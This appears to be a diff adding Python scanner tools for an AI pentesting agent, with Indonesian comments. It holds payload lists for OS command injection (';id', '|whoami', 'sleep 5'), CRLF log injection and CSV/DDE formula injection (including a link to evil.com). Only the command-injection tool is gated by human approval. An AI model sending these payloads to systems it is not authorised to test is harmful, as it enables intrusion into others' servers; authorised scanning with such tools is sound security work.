@@ -1,0 +1,278 @@
+import json
+import requests
+import re
+import time
+import urllib3
+from urllib.parse import quote, urlparse
+from langchain.tools import tool
+from rate_limiter import rate_limiter
+from cancellation import check_cancelled
+from checkpoint import require_approval
+from auth_store import get_auth_kwargs
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def _domain_of(url: str) -> str:
+    try:
+        return urlparse(url).netloc.split(":")[0].lower()
+    except Exception:
+        return url
+
+def _logger():
+    from custom_tools import exec_logger
+    return exec_logger
+
+
+# ==========================================
+# TOOL 1: Command / OS Injection Scanner
+# ==========================================
+@tool("command_injection_scanner")
+def command_injection_scanner(url: str, params: str = "") -> str:
+    """
+    Scan untuk OS Command Injection (RCE) pada target URL.
+    params: comma-separated parameter names (e.g., "cmd,exec,ping,host")
+    Mencoba payload time-based dan output-based detection.
+    """
+    tool_name = "Command Injection Scanner"
+    logger = _logger()
+    logger.add_log(tool_name, "START", f"Memulai command injection scan pada {url}")
+    if check_cancelled(logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."
+
+    approved = require_approval(
+        action=f"OS Command Injection scan pada {url}",
+        context=f"Mengirim OS command payloads (sleep, id, whoami) ke params: {params or 'default'}",
+        risk="high",
+        exec_logger=logger,
+    )
+    if not approved:
+        logger.add_log(tool_name, "BLOCKED", "Dibatalkan: approval ditolak")
+        return "SCAN DIBATALKAN: human-in-the-loop approval ditolak atau timeout."
+
+    domain = _domain_of(url)
+    auth_kwargs = get_auth_kwargs(domain)
+    param_list = [p.strip() for p in params.split(",")] if params else [
+        "cmd", "exec", "command", "ping", "host", "ip", "query",
+        "search", "input", "data", "file", "path", "url", "q"
+    ]
+
+    # Payloads: (payload, detection_type, expected_indicator)
+    payloads = [
+        # Output-based
+        (";id", "output", ["uid=", "gid=", "groups="]),
+        ("|id", "output", ["uid=", "gid=", "groups="]),
+        ("&&id", "output", ["uid=", "gid=", "groups="]),
+        ("`id`", "output", ["uid=", "gid=", "groups="]),
+        ("$(id)", "output", ["uid=", "gid=", "groups="]),
+        (";whoami", "output", ["root", "www-data", "apache", "nginx"]),
+        ("|whoami", "output", ["root", "www-data", "apache", "nginx"]),
+        # Windows
+        ("|whoami", "output", ["nt authority", "administrator"]),
+        ("&whoami", "output", ["nt authority", "administrator"]),
+        # Time-based (blind)
+        (";sleep 5", "time", []),
+        ("|sleep 5", "time", []),
+        ("&&sleep 5", "time", []),
+        ("& timeout /T 5", "time", []),  # Windows
+    ]
+
+    vulnerabilities = []
+
+    for param in param_list:
+        if check_cancelled(logger): break
+        for payload, detection_type, indicators in payloads:
+            try:
+                rate_limiter.wait(domain)
+                test_url = f"{url}?{param}={quote(payload)}"
+
+                if detection_type == "time":
+                    start = time.monotonic()
+                    r = requests.get(test_url, timeout=10, verify=False)
+                    elapsed = time.monotonic() - start
+                    if elapsed >= 4.5:
+                        vulnerabilities.append({
+                            "parameter": param,
+                            "payload": payload,
+                            "type": "Blind Command Injection (Time-Based)",
+                            "evidence": f"Response delayed {elapsed:.1f}s",
+                            "severity": "Critical"
+                        })
+                        logger.add_log(tool_name, "WARNING", f"Blind CMDi via time-delay: param={param}, delay={elapsed:.1f}s")
+                        break  # vuln confirmed, move to next param
+                else:
+                    r = requests.get(test_url, timeout=8, verify=False)
+                    if any(ind in r.text for ind in indicators):
+                        vulnerabilities.append({
+                            "parameter": param,
+                            "payload": payload,
+                            "type": "Command Injection (Output-Based)",
+                            "evidence": r.text[:200],
+                            "severity": "Critical"
+                        })
+                        logger.add_log(tool_name, "WARNING", f"CMDi confirmed: param={param}, payload={payload}")
+                        break
+            except requests.Timeout:
+                # Timeout itself can be evidence for time-based if payload was sleep
+                if "sleep" in payload or "timeout" in payload:
+                    vulnerabilities.append({
+                        "parameter": param,
+                        "payload": payload,
+                        "type": "Possible Blind Command Injection (Timeout)",
+                        "evidence": "Request timed out — potential sleep injection",
+                        "severity": "High"
+                    })
+            except Exception:
+                pass
+
+    result = {
+        "status": "VULNERABLE" if vulnerabilities else "SAFE",
+        "vulnerabilities": vulnerabilities,
+        "count": len(vulnerabilities),
+        "params_tested": param_list
+    }
+    logger.add_log(tool_name, "SUCCESS", f"Command injection scan selesai. Found: {len(vulnerabilities)}")
+    return json.dumps(result, indent=2)
+
+
+# ==========================================
+# TOOL 2: Log Injection Scanner
+# ==========================================
+@tool("log_injection_scanner")
+def log_injection_scanner(url: str) -> str:
+    """
+    Scan untuk Log Injection vulnerability.
+    Mencoba inject newline characters dan fake log entries ke parameter input
+    yang mungkin di-log oleh server (User-Agent, Referer, custom params).
+    """
+    tool_name = "Log Injection Scanner"
+    logger = _logger()
+    logger.add_log(tool_name, "START", f"Memulai log injection scan pada {url}")
+    if check_cancelled(logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."
+
+    domain = _domain_of(url)
+    auth_kwargs = get_auth_kwargs(domain)
+
+    log_payloads = [
+        "\r\n[INJECTED] Fake log entry from attacker",
+        "\n[ERROR] Admin password: hacked",
+        "%0d%0a[INJECTED] Fake entry",
+        "%0aFakeLogEntry: pwned",
+    ]
+
+    findings = {"vulnerabilities": [], "tested_vectors": ["User-Agent", "Referer", "X-Forwarded-For", "query_params"]}
+
+    for payload in log_payloads:
+        try:
+            rate_limiter.wait(domain)
+            # Test via headers (most common log injection vector)
+            headers = {
+                "User-Agent": f"Mozilla/5.0{payload}",
+                "Referer": f"https://legitimate-site.com{payload}",
+                "X-Forwarded-For": f"1.2.3.4{payload}",
+            }
+            r = requests.get(url, headers=headers, timeout=5, verify=False)
+            # Jika payload ter-reflect di response body, itu XSS+log injection
+            if "INJECTED" in r.text or "FakeLogEntry" in r.text:
+                findings["vulnerabilities"].append({
+                    "type": "Log Injection (Reflected)",
+                    "payload": payload,
+                    "vector": "HTTP Headers",
+                    "severity": "Medium",
+                    "note": "Payload reflected in response — also indicates XSS risk"
+                })
+                logger.add_log(tool_name, "WARNING", "Log injection payload reflected in response")
+                break
+        except Exception:
+            pass
+
+    # Check apakah ada log viewer yang accessible
+    rate_limiter.wait(domain)
+    base = url.rstrip("/")
+    for log_path in ["/logs", "/log", "/debug/logs", "/admin/logs", "/var/log"]:
+        try:
+            rate_limiter.wait(domain)
+            r = requests.get(f"{base}{log_path}", timeout=4, verify=False)
+            if r.status_code == 200 and len(r.text) > 200:
+                findings["vulnerabilities"].append({
+                    "type": "Log File Exposed",
+                    "url": f"{base}{log_path}",
+                    "severity": "High",
+                    "note": "Log file accessible — combined with log injection = critical"
+                })
+                logger.add_log(tool_name, "WARNING", f"Log file exposed: {log_path}")
+        except Exception:
+            pass
+
+    result = {
+        "status": "VULNERABLE" if findings["vulnerabilities"] else "SAFE",
+        "findings": findings
+    }
+    logger.add_log(tool_name, "SUCCESS", "Log injection scan complete")
+    return json.dumps(result, indent=2)
+
+
+# ==========================================
+# TOOL 3: CSV/Formula Injection Scanner
+# ==========================================
+@tool("csv_injection_scanner")
+def csv_injection_scanner(url: str, params: str = "") -> str:
+    """
+    Scan untuk CSV/Formula Injection (juga disebut Excel Injection).
+    Mencari input fields yang mungkin masuk ke file CSV/Excel export.
+    Payload seperti =CMD() atau =HYPERLINK() bisa execute code saat file dibuka.
+    params: comma-separated param names to test
+    """
+    tool_name = "CSV Injection Scanner"
+    logger = _logger()
+    logger.add_log(tool_name, "START", f"Memulai CSV injection scan pada {url}")
+    if check_cancelled(logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."
+
+    domain = _domain_of(url)
+    auth_kwargs = get_auth_kwargs(domain)
+    param_list = [p.strip() for p in params.split(",")] if params else [
+        "name", "username", "email", "comment", "note", "description",
+        "title", "message", "input", "data", "value", "text"
+    ]
+
+    # Formula injection payloads
+    csv_payloads = [
+        "=CMD|'/C calc'!A0",
+        "=HYPERLINK(\"http://evil.com\",\"Click\")",
+        "@SUM(1+1)*cmd|' /C calc'!A0",
+        "+cmd|' /C calc'!A0",
+        "-2+3+cmd|' /C calc'!A0",
+        "=1+1",  # safe probe — jika reflected as =1+1 in CSV, vuln confirmed
+        "DDE(\"cmd\",\"/C calc\",\"\")",
+    ]
+
+    vulnerabilities = []
+
+    for param in param_list:
+        for payload in csv_payloads:
+            try:
+                rate_limiter.wait(domain)
+                # Test GET
+                r = requests.get(f"{url}?{param}={quote(payload)}", timeout=5, verify=False)
+                # Jika payload ter-reflect AS-IS di response (terutama di CSV/text output), itu vuln
+                if payload in r.text:
+                    content_type = r.headers.get("Content-Type", "")
+                    is_csv = "csv" in content_type or "excel" in content_type or "spreadsheet" in content_type
+                    vulnerabilities.append({
+                        "parameter": param,
+                        "payload": payload,
+                        "type": "CSV/Formula Injection",
+                        "severity": "High" if is_csv else "Medium",
+                        "detail": f"Payload reflected in response. Content-Type: {content_type}"
+                    })
+                    logger.add_log(tool_name, "WARNING", f"CSV injection reflected: param={param}")
+                    break
+            except Exception:
+                pass
+
+    result = {
+        "status": "VULNERABLE" if vulnerabilities else "SAFE",
+        "vulnerabilities": vulnerabilities,
+        "count": len(vulnerabilities),
+        "note": "Even without reflection, check if app has CSV export feature — manual verification needed"
+    }
+    logger.add_log(tool_name, "SUCCESS", "CSV injection scan complete")
+    return json.dumps(result, indent=2)
